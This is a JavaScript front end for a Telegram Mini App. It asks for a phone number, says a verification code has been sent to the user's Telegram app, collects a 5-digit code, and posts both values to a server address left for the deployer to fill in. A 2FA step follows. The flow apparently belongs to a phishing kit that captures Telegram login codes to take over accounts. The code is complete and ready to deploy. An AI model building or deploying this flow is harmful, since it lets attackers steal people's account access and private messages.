document.addEventListener('DOMContentLoaded', function () {
    const tg = window.Telegram.WebApp;
    const phoneSection = document.getElementById('phone-section');
    const otpSection = document.getElementById('otp-section');
    const phoneInput = document.getElementById('phone-input');
    const sendOtpBtn = document.getElementById('send-otp-btn');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const keys = document.querySelectorAll('.key');
    const verifyBtn = document.getElementById('verify-btn');

    // ── Config ───────────────────────────────────────────────────────────────
    // TODO: Replace with your ngrok/deployed server URL
    // e.g. 'https://abc123.ngrok-free.app'  OR  'https://yourapp.render.com'
    const SERVER_URL = 'https://REPLACE_WITH_YOUR_SERVER_URL';

    let currentIndex = 0;
    let currentStep = 'phone';
    let userPhone = '';

    // Stable user ID from Telegram (falls back to timestamp if outside Telegram)
    const userId = tg.initDataUnsafe?.user?.id || 'user_' + Date.now();

    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation();

    // ── Phone Step ───────────────────────────────────────────────────────────
    sendOtpBtn.addEventListener('click', async function () {
        const phone = phoneInput.value.trim();

        if (phone.length < 10) {
            tg.showPopup({
                title: 'Error',
                message: 'Please enter a valid phone number!',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
            return;
        }

        userPhone = phone;
        sendOtpBtn.disabled = true;
        sendOtpBtn.textContent = 'Sending...';

        try {
            const res = await fetch(`${SERVER_URL}/send-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, user_id: String(userId) })
            });

            const result = await res.json();

            if (result.success) {
                showOtpSection();
                tg.showPopup({
                    title: 'Code Sent!',
                    message: 'Check your Telegram app for the verification code.',
                    buttons: [{ type: 'ok', text: 'OK' }]
                });
            } else {
                tg.showPopup({
                    title: 'Error',
                    message: result.message || 'Failed to send OTP.',
                    buttons: [{ type: 'ok', text: 'OK' }]
                });
            }
        } catch (err) {
            tg.showPopup({
                title: 'Error',
                message: 'Cannot reach server. Is it running?',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
        } finally {
            sendOtpBtn.disabled = false;
            sendOtpBtn.textContent = '📤 Send Verification Code';
        }
    });

    // ── OTP Section ──────────────────────────────────────────────────────────
    function showOtpSection() {
        phoneSection.style.display = 'none';
        otpSection.style.display = 'block';
        document.querySelector('.emoji-center .emoji').textContent = '🔢';
        currentStep = 'otp';
        currentIndex = 0;
        otpBoxes[0].focus();
    }

    function focusNextBox() {
        if (currentIndex < otpBoxes.length - 1) {
            currentIndex++;
            otpBoxes[currentIndex].focus();
        }
    }

    function focusPrevBox() {
        if (currentIndex > 0) {
            currentIndex--;
            otpBoxes[currentIndex].focus();
        }
    }

    function handleKeyPress(key) {
        if (key === 'backspace') {
            otpBoxes[currentIndex].value = '';
            focusPrevBox();
        } else if (!isNaN(key)) {
            otpBoxes[currentIndex].value = key;
            focusNextBox();
        }
    }

    otpBoxes.forEach((box) => {
        box.addEventListener('input', function () {
            if (this.value.length === 1) focusNextBox();
        });
        box.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && this.value === '') focusPrevBox();
        });
    });

    keys.forEach((key) => {
        key.addEventListener('click', function () {
            handleKeyPress(this.dataset.key);
        });
    });

    // ── Verify OTP ───────────────────────────────────────────────────────────
    verifyBtn.addEventListener('click', async function () {
        const otp = Array.from(otpBoxes).map((box) => box.value).join('');

        if (otp.length !== 5) {
            tg.showPopup({
                title: 'Error',
                message: 'Please enter the complete 5-digit code.',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
            return;
        }

        verifyBtn.disabled = true;
        verifyBtn.textContent = 'Verifying...';

        try {
            const res = await fetch(`${SERVER_URL}/verify-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ otp, user_id: String(userId) })
            });

            const result = await res.json();

            if (result.success) {
                if (result.twofa_required) {
                    // Notify the bot then redirect to 2FA page
                    tg.sendData('otp_verified:needs_2fa');
                } else {
                    tg.sendData('verified:success');
                }
            } else {
                tg.showPopup({
                    title: 'Invalid Code',
                    message: result.message || 'Incorrect code. Please try again.',
                    buttons: [{ type: 'ok', text: 'OK' }]
                });
                // Clear OTP boxes for retry
                otpBoxes.forEach((b) => (b.value = ''));
                currentIndex = 0;
                otpBoxes[0].focus();
            }
        } catch (err) {
            tg.showPopup({
                title: 'Error',
                message: 'Cannot reach server.',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
        } finally {
            verifyBtn.disabled = false;
            verifyBtn.textContent = '✅ Verify Code';
        }
    });
});
